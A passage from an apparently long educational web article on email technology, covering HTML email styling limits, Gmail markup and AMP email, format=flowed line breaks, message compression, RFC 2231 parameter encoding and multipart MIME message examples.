are not allowed inside the <a href="https://www.w3.org/TR/css-style-attr/#syntax">style attribute</a>,
which means that you cannot implement
<a href="https://developer.mozilla.org/en-US/docs/Learn/CSS/CSS_layout/Responsive_Design">responsive design</a>
and optional <a href="https://htmlemail.io/blog/dark-mode-email-styles">dark mode</a> with inline <abbr title="Cascading Style Sheets">CSS</abbr>.
As we’ll see later, Gmail removes the <code>&lt;style&gt;</code> element when <a href="#quoting-html-messages">quoting an <abbr title="HyperText Markup Language">HTML</abbr> message</a>, though.
And since email styling can be abused to make the same message <a href="#different-appearances">appear differently</a>
to different recipients, it might be a good idea to abandon <a href="#html-emails"><abbr title="HyperText Markup Language">HTML</abbr> emails</a> altogether.</p>

</details>

<details>
  <summary id="email-markup">
Email markup
</summary>

  <p>Since emails can be written in <abbr title="HyperText Markup Language">HTML</abbr>,
you can annotate your message so that not just the receiving user
but also the receiving client can make sense of it.
Making information easier to understand and to act upon for machines is
the goal of the <a href="https://en.wikipedia.org/wiki/Semantic_Web">Semantic Web</a>.
<a href="https://developers.google.com/gmail/markup/overview">Gmail supports</a>
certain <a href="https://schema.org/">schema.org</a> <a href="https://en.wikipedia.org/wiki/Ontology_(information_science)">ontologies</a>.
You can use them to define <a href="https://developers.google.com/gmail/markup/actions/actions-overview">actions</a>,
such as one-click confirmations,
and <a href="https://developers.google.com/gmail/markup/highlights">highlights</a>, such as reservations,
which users can take or view directly from their inbox without even having to open the email.</p>

  <p>In order to use these features,
senders have to <a href="https://developers.google.com/gmail/markup/registering-with-google">register with Google</a>
and authenticate their messages with <a href="#sender-policy-framework"><abbr title="Sender Policy Framework">SPF</abbr></a> or <a href="#domainkeys-identified-mail"><abbr title="DomainKeys Identified Mail">DKIM</abbr></a>.
No registration is required for
<a href="https://developers.google.com/gmail/markup/testing-your-schema#self_testing">sending messages to yourself</a>,
but such messages still have to fulfill the <abbr title="Sender Policy Framework">SPF</abbr> or <abbr title="DomainKeys Identified Mail">DKIM</abbr> requirement.
Unfortunately, Gmail doesn’t authenticate messages with <abbr title="Sender Policy Framework">SPF</abbr> or <abbr title="DomainKeys Identified Mail">DKIM</abbr> when you send them to yourself,
no matter whether you submit them from the web interface or from the command line with the <a href="#esmtp-tool">tool above</a>.
I got the email markup to work only by following
<a href="https://developers.google.com/gmail/markup/apps-script-tutorial">this tutorial</a>.</p>

</details>

<details>
  <summary id="dynamic-content">
Dynamic content
</summary>

  <p><a href="https://developers.google.com/gmail/ampemail/">Gmail</a>,
<a href="https://postmaster.mail.ru/amp/">Mail.ru</a>, and
<a href="https://developer.verizonmedia.com/mail/amp-for-email/">Yahoo Mail</a>
support interactive messages based on
<a href="https://en.wikipedia.org/wiki/Accelerated_Mobile_Pages">Accelerated Mobile Pages (<abbr title="Accelerated Mobile Pages">AMP</abbr>)</a>.
<a href="https://amp.dev/"><abbr title="Accelerated Mobile Pages">AMP</abbr></a> was initiated by Google in order to make websites load faster on mobile.
It achieves this by providing <a href="https://amp.dev/documentation/components/">built-in components</a>
and making websites <a href="https://en.wikipedia.org/wiki/Cache_(computing)">cacheable</a> so that they can be served
through a <a href="https://en.wikipedia.org/wiki/Content_delivery_network">content delivery network (<abbr title="Content Delivery Network">CDN</abbr>)</a>.
While <a href="https://amp.dev/about/websites/"><abbr title="Accelerated Mobile Pages">AMP</abbr> for websites</a> supports
<a href="https://amp.dev/documentation/guides-and-tutorials/develop/custom-javascript/">custom JavaScript</a>,
you can use only the <a href="https://amp.dev/documentation/guides-and-tutorials/start/create_email/#start-with-the-amp-email-boilerplate">default library</a>
when using <a href="https://amp.dev/about/email/"><abbr title="Accelerated Mobile Pages">AMP</abbr> for emails</a>.
It’s basically a whitelisted <a href="https://en.wikipedia.org/wiki/Web_framework">web framework</a>.
As with <a href="#email-markup">email markup</a>, you have to
<a href="https://amp.dev/documentation/guides-and-tutorials/start/email_sender_distribution/">register yourself as a sender</a>
with the mailbox providers before they display your dynamic content to their users.
<abbr title="Accelerated Mobile Pages">AMP</abbr> messages must be <a href="#domain-authentication">authenticated</a> and
must contain an ordinary <a href="#multipart-messages"><abbr title="HyperText Markup Language">HTML</abbr> or plaintext version</a> of the same content,
which is displayed when the mail client is offline or
<a href="https://developers.google.com/gmail/ampemail/testing-dynamic-email#delivery_requirements">30 days after receiving the message</a>.</p>

</details>

<details>
  <summary id="soft-line-breaks">
Soft line breaks
</summary>

  <p>The problem with <a href="https://evalapply.org/internet/#text-based-protocols">text-based protocols</a> is that
some characters, which can usually also appear in the message, are used for a special purpose.
In order not to break the protocol, such characters have to be
<a href="https://en.wikipedia.org/wiki/Escape_character">escaped</a> inside the message.
We have seen several examples of this already:
<a href="#simple-mail-transfer-protocol"><abbr title="Simple Mail Transfer Protocol">SMTP</abbr></a> and <a href="#post-office-protocol-version-3"><abbr title="Post Office Protocol version 3">POP3</abbr></a> require
leading periods on a line to be <a href="#message-termination">escaped with an additional period</a>,
<a href="#internet-message-access-protocol"><abbr title="Internet Message Access Protocol">IMAP</abbr></a> and <a href="#mail-filtering-language">Sieve</a> require
double quotes and backslashes to be escaped with a backslash in quoted arguments,
the <a href="#content-encoding">Quoted-Printable encoding</a> requires <code>=</code> to be escaped as <code>=3D</code>,
and the <a href="#header-encoding">Encoded-Word encoding</a> requires <code>?</code> to be escaped as <code>=3F</code>.
There are two more situations in which email conventions conflict with user intent:
The <a href="#line-length-limit">line-length limit</a> requires the mail client to insert additional newlines
and <a href="#quoting-the-previous-message">message quoting</a> with the greater-than sign requires
that unquoted lines don’t start with <code>&gt;</code>.</p>

  <p><a href="https://datatracker.ietf.org/doc/html/rfc3676"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 3676</a> addresses both issues.
Firstly, the sending mail client removes spaces before user-inserted newlines
and ensures that there is a space before client-inserted newlines.
Secondly, the sending mail client inserts a space at the beginning of all newly written lines
which start with a greater-than sign.
It then informs the receiving mail client about these transformations
by adding the <code>format=flowed</code> parameter to the <code>text/plain</code> content type.
When the receiving mail client sees this parameter,
it removes the newlines which are preceded by a space
and the spaces which are followed by a greater-than sign at the start of a line
after determining which lines are quoted.</p>

  <p>The sending mail client can either insert <a href="https://en.wikipedia.org/wiki/Line_wrap_and_word_wrap">soft line breaks</a>
after existing spaces or insert the preceding space as well.
It indicates the former behavior by adding the content type parameter <code>delsp=no</code>.
If the mail client also inserted the preceding space, it adds <code>delsp=yes</code>.
In the former case, the receiving mail client replaces <abbr title="Space character">SP</abbr>+<abbr title="Carriage Return (first newline character)">CR</abbr>+<abbr title="Line Feed (second newline character)">LF</abbr> with <abbr title="Space character">SP</abbr>.
In the latter case, the receiving mail client simply removes all occurrences of <abbr title="Space character">SP</abbr>+<abbr title="Carriage Return (first newline character)">CR</abbr>+<abbr title="Line Feed (second newline character)">LF</abbr>.
This is useful for content which doesn’t use the <abbr title="American Standard Code for Information Interchange">ASCII</abbr> space character.</p>

  <p>If we reduce the line-length limit to eight
(including the <a href="#newline-characters">two newline characters</a>),
<code>2 + 2 &gt; 3</code> can be encoded as follows:</p>

  <figure>

    <div><div><pre><code>MIME-Version:␣1.0↵
Content-Transfer-Encoding:␣7bit↵
Content-Type:␣text/plain;␣charset=us-ascii;␣format=flowed;␣delsp=no↵
↵
2␣+␣2␣↵
␣&gt;␣3
</code></pre></div>    </div>

    <figcaption>

How to respect the <a href="#line-length-limit">line-length limit</a> and <a href="#quoting-the-previous-message">message quoting</a>
without having to resort to <a href="#content-encoding">Quoted-Printable encoding</a>.</figcaption>
  </figure>

  <p>The standard for <code>format=flowed</code> is a bit more complicated than how I explained it.
On the one hand, a space can be inserted at the beginning of any line,
which means that lines which already start with a space have to be protected with an additional space.
(For <a href="https://datatracker.ietf.org/doc/html/rfc3676#section-4.4">historical reasons</a>,
lines which start with <code>From</code> also have to be protected by inserting a leading space.)
On the other hand, it also specifies how to handle consecutive lines
with <a href="https://datatracker.ietf.org/doc/html/rfc3676#section-4.5">different quote levels</a>,
which always lead to hard line breaks.</p>

  <p>As far as I can tell, most messages are encoded with either Quoted-Printable or Base64,
which have their own ways of handling client-inserted newlines.
Most users never encounter the line-length limitation of email:
They see neither unwanted newlines nor a horizontal scrollbar
because a message is displayed as <code>format=fixed</code> when it should be flowed.
There are exceptions, though.
For example, Thunderbird breaks lines in the compose window by default,
even though it uses <code>format=flowed</code> correctly and displays such messages correctly
(i.e. flowed according to the width of your screen).
The only fix I found for this annoyance is to set <code>mailnews.wraplength</code> to <code>0</code>
in Thunderbird’s <a href="https://support.mozilla.org/en-US/kb/config-editor">config editor</a>.
If a line becomes longer than 1’000 characters,
Thunderbird then decides to encode the message with Base64
rather than to apply <code>format=flowed</code> as it would otherwise.</p>

</details>

<details>
  <summary id="message-compression">
Message compression
</summary>

  <p>To the best of my knowledge, emails are rarely <a href="https://en.wikipedia.org/wiki/Data_compression">compressed</a>
even though this would save a lot of bandwidth during relay and a lot of memory during <a href="#storage-format">storage</a>.
For example, <abbr title="HyperText Markup Language">HTML</abbr> newsletters are often between 50 KB and 120 KB in size,
and compression reduces this by 70 to 90% due to the many repetitions of <a href="#email-styling">styling information</a>.
Most of the websites you visit are delivered to your browser in compressed form.
So why is it that emails are rarely compressed?
The problem in the case of email is that the sender doesn’t know
whether the mail clients of the recipient support a new encoding.
Since compression wasn’t included
when the now widely supported <a href="#content-encoding">content encodings</a> were introduced,
it’s very difficult to transition to compressed message bodies now.
Additionally, the email protocols in general and the Quoted-Printable encoding in particular
are designed to be human-readable.
Compressed data, on the other hand, would have to be encoded with Base64
and can be decompressed only with specialized software.
As we will see in the <a href="#multipart-messages">next section</a>,
it’s much easier to introduce new content types than to change the encoding of existing ones
because the new and potentially unknown content type can be complemented with known types.
Since the goal of compression is to decrease the size of messages,
we don’t want to add yet another part to messages, though.</p>

  <p>In the case of <abbr title="HyperText Transfer Protocol">HTTP</abbr>, we don’t have this problem
because clients can simply list the encodings that they accept in their requests:</p>

  <figure>
    <svg id="figure-http-compression" data-name="http-compression" width="347.50800000000004" height="183.25" viewBox="-54.754 -1.25 347.50800000000004 183.25" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <g>
        <rect x="-53.504" y="0" width="107.009" height="39.5" rx="8" ry="8"></rect>
        <text text-anchor="middle">
            <tspan x="0" y="25.65"><tspan>Web client</tspan></tspan>
        </text>
        <line x1="0" y1="40.75" x2="0" y2="180.75"></line>
    </g>
    <g>
        <rect x="184.496" y="0" width="107.009" height="39.5" rx="8" ry="8"></rect>
        <text text-anchor="middle">
            <tspan x="238" y="25.65"><tspan>Web server</tspan></tspan>
        </text>
        <line x1="238" y1="40.75" x2="238" y2="180.75"></line>
    </g>
    <g>
        <line x1="0" y1="103.5" x2="236.75" y2="103.5" marker-start="url(#circle-blue)" marker-end="url(#arrow-blue)" stroke-dasharray="230"></line>
        <text text-anchor="middle">
            <tspan x="118.375" y="69.5">GET /file <tspan>http</tspan>/1.1</tspan><tspan x="118.375" y="91.5">Accept-Encoding: br, gzip</tspan>
        </text>
    </g>
    <g>
        <line x1="238" y1="167.5" x2="1.25" y2="167.5" marker-start="url(#circle-green)" marker-end="url(#arrow-green)" stroke-dasharray="230"></line>
        <text text-anchor="middle">
            <tspan x="119.625" y="133.5"><tspan>http</tspan>/1.1 200 OK</tspan><tspan x="119.625" y="155.5">Content-Encoding: gzip</tspan>
        </text>
    </g>

</svg>

    <figcaption>

How <a href="https://en.wikipedia.org/wiki/HTTP_compression"><abbr title="HyperText Transfer Protocol">HTTP</abbr> compression</a> works.
The most used compressions are <a href="https://en.wikipedia.org/wiki/Gzip">gzip</a> and <a href="https://en.wikipedia.org/wiki/Brotli">br</a>.
You can inspect these header fields with the
<a href="https://en.wikipedia.org/wiki/Web_development_tools">developer tools</a> of your browser.

</figcaption>
  </figure>

  <p>The only standardized way to compress emails during relay is with <a href="#comparison-of-smime-and-pgp"><abbr title="Secure/Multipurpose Internet Mail Extensions">S/MIME</abbr></a>,
which we’ll discuss later.
<a href="https://datatracker.ietf.org/doc/html/rfc8551#section-3.6">Section 3.6 of <abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 8551</a>
provides the following example for how to use <abbr title="Secure/Multipurpose Internet Mail Extensions">S/MIME</abbr> for compression only:</p>

  <figure>

    <div><div><pre><code>Content-Type: application/pkcs7-mime; smime-type=compressed-data; name=smime.p7z
Content-Transfer-Encoding: base64

eNoLycgsVgCi4vzcVIXixNyCnFSF5Py8ktS8Ej0AlCkKVA==
</code></pre></div>    </div>

    <figcaption>

How <a href="#comparison-of-smime-and-pgp"><abbr title="Secure/Multipurpose Internet Mail Extensions">S/MIME</abbr></a> can be used to compress messages
using the <a href="https://en.wikipedia.org/wiki/Zlib">ZLIB compression format</a>
as specified in <a href="https://datatracker.ietf.org/doc/html/rfc1950"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 1950</a>.

</figcaption>
  </figure>

  <p>You can decompress this example message with the following commands.
<a href="https://zlib.net/pigz/"><code>pigz</code></a> stands for Parallel Implementation of <a href="https://en.wikipedia.org/wiki/Gzip">GZip</a>,
and it can be installed on macOS with <code>brew install pigz</code> if you have <a href="https://brew.sh/">Homebrew</a>.
Using <code>gzip -dc</code> instead of <code>pigz -d</code> doesn’t work because
<code>gzip</code> doesn’t recognize the compression format
if the file doesn’t start with <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">specific bytes</a>.</p>

  <figure>
    
    <figcaption>

The <a href="https://en.wikipedia.org/wiki/Pipeline_(Unix)">pipeline</a> of commands
to <a href="#decoding-on-the-command-line">Base64-decode</a> and ZLIB-decompress the string from the above example message.

</figcaption>
  </figure>

  <p>Since mail clients have no (standardized) way to advertise their capabilities to other mail clients,
we won’t see compression of messages from the mail client of the sender
to the mail client of the recipient anytime soon.
This doesn’t prevent mail clients and mail servers from compressing messages between them, though,
as they can advertise <a href="#imap-extensions">their capabilities</a> as part of the used protocol.
<a href="https://datatracker.ietf.org/doc/html/rfc4978"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 4978</a> specifies the <code>COMPRESS</code> extension
for <a href="#internet-message-access-protocol"><abbr title="Internet Message Access Protocol">IMAP</abbr></a>,
which allows the client and the server to agree on compressing their communication.
Since mail clients can store messages in whatever format they want,
compressing locally stored emails is by far the lowest hanging fruit.
However, neither <a href="#storage-format">Thunderbird</a> nor <a href="#apple-mail-storage-format">Apple Mail</a>
compresses the messages which it stores locally.</p>

</details>

<details>
  <summary id="internationalized-parameter-values">
Internationalized parameter values
</summary>

  <p>As we will see in the <a href="#multipart-messages">next section</a>,
<abbr title="Multipurpose Internet Mail Extensions">MIME</abbr> parameters are sometimes used to convey user-chosen information,
such as the filename of attachments.
<a href="https://datatracker.ietf.org/doc/html/rfc2231"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 2231</a> specifies
<a href="https://datatracker.ietf.org/doc/html/rfc2231#section-4">yet another encoding</a>
to support non-<abbr title="American Standard Code for Information Interchange">ASCII</abbr> characters in parameter values.
The sender indicates that the value is encoded by putting an asterisk before the equals sign.
The value itself then starts with the name of the <a href="#character-encoding">character set</a>,
followed by optional language information and the encoded value.
These three pieces of information are separated by a single quote.
The encoding is similar to the <a href="#percent-encoding">percent encoding</a>,
but the reserved characters, which have to be encoded, are different
and the character set doesn’t have to be <abbr title="Unicode Transformation Format">UTF</abbr>-8.
See the formal syntax in <a href="https://datatracker.ietf.org/doc/html/rfc2231#section-7"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 2231</a>
and <a href="https://datatracker.ietf.org/doc/html/rfc2045#section-5.1"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 2045</a> for more information.
I’ve implemented a tool which encodes and decodes extended parameters for you.
Let’s look at <a href="#tool-encoding-extended-parameter&amp;decoded=filename%3D%22%C2%A1Buenos+d%C3%ADas%21.txt%22&amp;encoded=filename%2a%3Diso-8859-1%27es%27%25A1Buenos%2520d%25EDas%21.txt" title="Set the value of the Extended-Parameter tool.">an example</a>:</p>

  

  <p>Remarks on the above tool and the Extended-Parameter encoding:</p>
  <ul>
    <li><strong>Invalid inputs</strong>: In both directions, the tool doesn’t complain about invalid inputs
and simply encodes or decodes the input as good as it can.
If your input is invalid, the output of the tool is likely also invalid.
Therefore, don’t use this tool in production!</li>
    <li><strong>Quoted values</strong>: Unencoded parameter values have to be quoted if they contain certain characters
such as spaces or what the standard calls <a href="https://datatracker.ietf.org/doc/html/rfc2045#section-5.1"><code>tspecials</code></a>.
The quotes themselves are not part of the value, and encoded values are never quoted.</li>
    <li><strong>Parameter continuations</strong>: <a href="https://datatracker.ietf.org/doc/html/rfc2231#section-3"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 2231</a>
also introduced a mechanism which allows you to split long parameter values
in order to adhere to the <a href="#line-length-limit">line-length limit</a>.
You can use several parameters to encode a single parameter value
by enumerating the parameter name with a decimal number after an asterisk.
For example, <a href="#tool-encoding-extended-parameter&amp;decoded=name%3D%22Hello%2C+World%21%22&amp;encoded=name%2a0%3D%22Hello%2C+%22%3B%0Aname%2a1%3DWorld%21" title="Set the value of the Extended-Parameter tool."><code>name*0=&#34;Hello, &#34;; name*1=World!</code></a>
decodes to <code>name=&#34;Hello, World!&#34;</code>.
Please note that the above tool only decodes parameter continuations but doesn’t generate them.</li>
    <li><strong>Parameter ordering</strong>: According to <a href="https://datatracker.ietf.org/doc/html/rfc2045#section-5"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 2045</a>,
the ordering of parameters is not significant.
In order to remain backward compatible, this is also the case for parameter continuations:
<a href="#tool-encoding-extended-parameter&amp;decoded=name%3D%22Hello%2C+World%21%22&amp;encoded=name%2a1%3DWorld%21%3B%0Aname%2a0%3D%22Hello%2C+%22" title="Set the value of the Extended-Parameter tool."><code>name*1=World!; name*0=&#34;Hello, &#34;</code></a>
also decodes to <code>name=&#34;Hello, World!&#34;</code>.</li>
    <li><strong>Combining encodings and continuations</strong>: You can combine value encodings and parameter continuations.
Encoded and unencoded segments can be mixed.
The first segment has to be encoded
and it contains the character set and the language information for all the encoded segments.
Further encoded segments don’t repeat the character set and the language information,
which means that you cannot mix character sets with parameter continuations.
For example, <a href="#tool-encoding-extended-parameter&amp;decoded=name%3D%22%C2%A1Buenos+d%C3%ADas%21%22&amp;encoded=name%2a2%2a%3Dd%25EDas%21%3B%0Aname%2a0%2a%3Diso-8859-1%27es%27%25A1%3B%0Aname%2a1%3D%22Buenos+%22" title="Set the value of the Extended-Parameter tool."><code>name*2*=d%EDas!; name*0*=iso-8859-1&#39;es&#39;%A1; name*1=&#34;Buenos &#34;</code></a>
decodes to <code>name=&#34;¡Buenos días!&#34;</code>.</li>
    <li><strong>Parameter separations</strong>: Not only do you have to reorder continued parameters,
you also can’t just split the parameters at the semicolons because semicolons are allowed in quoted strings.
For example, <a href="#tool-encoding-extended-parameter&amp;decoded=name%3D%22%5C%22%3B%F0%9F%98%AC+%22&amp;encoded=name%2a%3Dutf-8%27%27%2522%253B%25F0%259F%2598%25AC%2520" title="Set the value of the Extended-Parameter tool."><code>name=&#34;\&#34;;😬 &#34;</code></a>
is a single parameter and has to be encoded as such.</li>
    <li><strong>Language information</strong>: The format of the language tag
is specified in <a href="https://datatracker.ietf.org/doc/html/rfc5646"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5646</a>.
The language tag has been introduced to provide context for
<a href="https://en.wikipedia.org/wiki/Screen_reader">screen readers</a>.
The language information can be skipped, but the delimiting single quote must be kept.
Since the above tool doesn’t know in which language you write,
it always skips this field when encoding your input.
<a href="https://datatracker.ietf.org/doc/html/rfc2231#section-5"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 2231</a>
also extends the <a href="#header-encoding">Encoded-Word encoding</a>
so that other header fields can also specify the language they’re written in.
An example is <a href="https://en.wikipedia.org/wiki/Taste"><code>=?US-ASCII*EN?Q?Taste?=</code></a>
versus <a href="https://de.wikipedia.org/wiki/Taste"><code>=?US-ASCII*DE?Q?Taste?=</code></a>,
which should be <a href="https://www.dict.cc/?s=taste">pronounced differently</a>.</li>
    <li><strong>Unicode normalization</strong>: Everyone <a href="#unicode-normalization">normalizes Unicode</a> to <abbr title="Normalization Form (Canonical) Composition (for Unicode strings)">NFC</abbr>
except <a href="https://en.wikipedia.org/wiki/Apple_Inc.">Apple</a>,
who <a href="https://en.wikipedia.org/wiki/Think_different">thought differently</a>
and normalizes filenames in <a href="https://en.wikipedia.org/wiki/MacOS">macOS</a> to <abbr title="Normalization Form (Canonical) Decomposition (for Unicode strings)">NFD</abbr>.
If you send a file called <code>¡Buenos días!.txt</code> with Apple Mail,
the filename is encoded as <a href="#tool-encoding-extended-parameter&amp;decoded=filename%3D%22%C2%A1Buenos+di%CC%81as%21.txt%22&amp;encoded=filename%2a%3Dutf-8%27%27%25C2%25A1Buenos%2520di%25CC%2581as%2521.txt" title="Set the value of the Extended-Parameter tool."><code>filename*=utf-8&#39;&#39;%C2%A1Buenos%20di%CC%81as%21.txt</code></a>.
<code>i%CC%81</code> encodes the <a href="https://unicode-table.com/en/0069/">Latin small letter i</a>
followed by the <a href="https://unicode-table.com/en/0301/">combining acute accent</a>.
You don’t even need to send an email to verify this:
You can just paste an <abbr title="Normalization Form (Canonical) Composition (for Unicode strings)">NFC</abbr> normalized string into a filename on macOS
and then copy the filename back to the <a href="#tool-encoding-normalization">Unicode normalization tool</a>
with the normalization option <code>None</code> to see that the string is now normalized to <abbr title="Normalization Form (Canonical) Decomposition (for Unicode strings)">NFD</abbr>.</li>
  </ul>

</details>

<h3 id="multipart-messages">Multipart messages</h3>

<p>Now that we can send <a href="#content-encoding">arbitrary files</a> via email,
we can design <a href="https://en.wikipedia.org/wiki/File_format">file formats</a>
to include several files in a single message body.
<a href="https://datatracker.ietf.org/doc/html/rfc2046#section-5.1"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 2046</a> defines various
<a href="#content-type">content types</a> to split a message into multiple parts.
What all the multipart formats have in common is that they are
<a href="https://evalapply.org/internet/#text-based-protocols">text-based</a>.
This means that the various parts have to be separated with a character sequence
which may not appear in any of the parts themselves.
The character sequence is chosen by the sending mail client for each message
and provided to the recipient in a content-type parameter called <a href="#boundary-delimiter">boundary</a>.
Let’s look at the two most common <a href="https://en.wikipedia.org/wiki/MIME#Multipart_subtypes">multipart types</a>
and leave the rest for the boxes below.</p>

<ul>
  <li><a href="https://datatracker.ietf.org/doc/html/rfc2046#section-5.1.3"><code>multipart/mixed</code></a>
bundles independent parts into a single message.
This content type is used to attach files to a message.
If a client doesn’t recognize a <code>multipart</code> subtype,
it should treat the content as <code>multipart/mixed</code>
and show the recognized parts.
    <figure>

      <div><div><pre><code>MIME-Version: 1.0
Content-Type: multipart/mixed; boundary=&#34;UniqueBoundary&#34;

--UniqueBoundary
Content-Type: text/plain
Content-Transfer-Encoding: 7bit

This message has an attachment.

--UniqueBoundary
Content-Type: image/png
Content-Transfer-Encoding: base64

iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAAAsSAAAL
EgHS3X78AAAB4klEQVQ4y5VVwU7CQBDdKl5IVz8Fg95ZQH+BhBP/UEAxKv/AN3jG
/1ATPeqlJr169WRpi/NmZ8uCEGqTl53OzrzO7MxOVdiKFB6s2gwDkeuEAeGRkBAW
gkR02KvDFj4+hxMCpUq5T4h1d7LU3Zulbo+X5GQBGToC2XzC1vML1lmtPGMiciQ5
I/xgBRmtBSFHpPS+0O0rRzzz/JWf5kxf3CKSQneusea8whGyjbIQ4kI+lMHHkTou
TpMjA5kZpoQpoUnoEeJ1UiKzdiDKmdRG2ldeAWI+HxvZvfIeem9wihKhO09EKWuG
D4KDC4WKITpJAUbnQnREugOR3+RjWVkgkMkR8AdtlAMQzj1C4ExIHNkh4XkbIaff
YlJHOAdhos3IpbCN8IDw4hHmshZeoXLpjERJG7jNfYSpd9ZloUIj52mixT8IqdId
rvYX4bXsxVVLlYRVUn46vryD0wPhRPSnrqVC+Hkp7ytKwFU2w29CKK1Wk70e0seN
8otSpW0+CO9MZqIa9kSP5s85QssxqNrYLvrGxt7UXs/xqrGrXb2xmzqx6Jpik6IX
Jbq+8i90heGQs+zvwXZzOFQdX+7ess5EmZ2Nk7/ja/+AHXkDdiQDduLObPeA3fEL
mMvYTwWJ6Hb+An4Bgrjq/fe5+zgAAAAASUVORK5CYII=

--UniqueBoundary--
</code></pre></div>      </div>

      <figcaption>

An example <code>multipart/mixed</code> message.
<a href="#tool-protocol-esmtp&amp;content=multipart%2Fmixed&amp;body=--UniqueBoundary%0AContent-Type%3A+text%2Fplain%0AContent-Transfer-Encoding%3A+7bit%0A%0AThis+message+has+an+attachment.%0A%0A--UniqueBoundary%0AContent-Type%3A+image%2Fpng%0AContent-Transfer-Encoding%3A+base64%0A%0AiVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAAAsSAAAL%0AEgHS3X78AAAB4klEQVQ4y5VVwU7CQBDdKl5IVz8Fg95ZQH%2BBhBP%2FUEAxKv%2FAN3jG%0A%2F1ATPeqlJr169WRpi%2FNmZ8uCEGqTl53OzrzO7MxOVdiKFB6s2gwDkeuEAeGRkBAW%0AgkR02KvDFj4%2BhxMCpUq5T4h1d7LU3Zulbo%2BX5GQBGToC2XzC1vML1lmtPGMiciQ5%0AI%2FxgBRmtBSFHpPS%2B0O0rRzzz%2FJWf5kxf3CKSQneusea8whGyjbIQ4kI%2BlMHHkTou%0ATpMjA5kZpoQpoUnoEeJ1UiKzdiDKmdRG2ldeAWI%2BHxvZvfIeem9wihKhO09EKWuG%0AD4KDC4WKITpJAUbnQnREugOR3%2BRjWVkgkMkR8AdtlAMQzj1C4ExIHNkh4XkbIaff%0AYlJHOAdhos3IpbCN8IDw4hHmshZeoXLpjERJG7jNfYSpd9ZloUIj52mixT8IqdId%0ArvYX4bXsxVVLlYRVUn46vryD0wPhRPSnrqVC%2BHkp7ytKwFU2w29CKK1Wk70e0seN%0A8otSpW0%2BCO9MZqIa9kSP5s85QssxqNrYLvrGxt7UXs%2FxqrGrXb2xmzqx6Jpik6IX%0AJbq%2B8i90heGQs%2BzvwXZzOFQdX%2B7ess5EmZ2Nk7%2Fja%2F%2BAHXkDdiQDduLObPeA3fEL%0AmMvYTwWJ6Hb%2BAn4Bgrjq%2Ffe5%2BzgAAAAASUVORK5CYII%3D%0A%0A--UniqueBoundary--" title="Set the body of the ESMTP tool to this multipart/mixed example.">Click here</a>
to use this example in the <a href="#esmtp-tool"><abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr> tool</a> above.

</figcaption>
    </figure>
  </li>
  <li><a href="https://datatracker.ietf.org/doc/html/rfc2046#section-5.1.4"><code>multipart/alternative</code></a>
bundles alternative versions of the same content into a single message.
This content type is used to provide a fallback version of the content
for mail clients that don’t support the preferred content type.
The versions are to be listed in increasing order of preference,
which means that the preferred format comes last.
This has the advantage that users of mail clients
which don’t support multipart messages see the simplest version of the message first.
Mail clients usually display the last part which has a content type that they support
unless the user configured a different preference.
<code>multipart/alternative</code> is most commonly used to provide a plaintext version of <a href="#html-emails"><abbr title="HyperText Markup Language">HTML</abbr> messages</a>
for users of <a href="https://en.wikipedia.org/wiki/Text-based_user_interface">text-based</a> mail clients,
such as <a href="https://en.wikipedia.org/wiki/Elm_(email_client)">Elm</a>,
<a href="https://en.wikipedia.org/wiki/Pine_(email_client)">Pine</a>,
and <a href="https://en.wikipedia.org/wiki/Mutt_(email_client)">Mutt</a>,
which <a href="https://wiki.archlinux.org/index.php/Mutt#Viewing_HTML">cannot render <abbr title="HyperText Markup Language">HTML</abbr></a>.
To give you another example,
I could have included a plaintext version of the <a href="#enriched-text">Enriched-Text message</a>
so that Gmail could display that instead of offering me to download the unrecognized content.
    <figure>

      <div><div><pre><code>MIME-Version: 1.0
Content-Type: multipart/alternative; boundary=&#34;UniqueBoundary&#34;

--UniqueBoundary
Content-Type: text/plain

Roses are red.

--UniqueBoundary
Content-Type: text/enriched

&lt;bold&gt;Roses&lt;/bold&gt; &lt;italic&gt;are&lt;/italic&gt;
&lt;color&gt;&lt;param&gt;red&lt;/param&gt;red&lt;/color&gt;.

--UniqueBoundary
Content-Type: text/html

&lt;html&gt;
  &lt;body&gt;
    &lt;b&gt;Roses&lt;/b&gt; &lt;i&gt;are&lt;/i&gt;
    &lt;span style=&#34;color:red;&#34;&gt;red&lt;/span&gt;.
  &lt;/body&gt;
&lt;/html&gt;

--UniqueBoundary--
</code></pre></div>      </div>

      <figcaption>

An example <code>multipart/alternative</code> message.
